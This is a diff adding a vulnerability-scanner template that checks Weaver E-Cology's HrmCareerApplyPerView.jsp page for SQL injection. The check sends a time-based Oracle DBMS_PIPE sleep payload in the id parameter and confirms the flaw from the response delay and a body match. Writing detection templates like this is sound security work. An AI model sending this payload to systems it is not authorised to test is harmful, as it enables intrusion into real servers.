@@ -1,0 +1,31 @@
+id: poc-weaver-ecology-hrmcareerapplyperview-sql-injection
+info:
+  name: Weaver E-Cology HrmCareerApplyPerView SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: e-cology
+
+variables:
+  t1: "{{rand_int(3,8)}}"
+
+http:
+  - raw:
+      - |
+        GET /pweb/careerapply/HrmCareerApplyPerView.jsp?id=1%20AND%201745=DBMS_PIPE.RECEIVE_MESSAGE(CHR(87)||CHR(82)||CHR(67)||CHR(81),{{t1}}) HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - duration > 2*to_number(t1)
+      - type: word
+        words:
+          - "/U>-编辑</BUTTON"
+        part: body
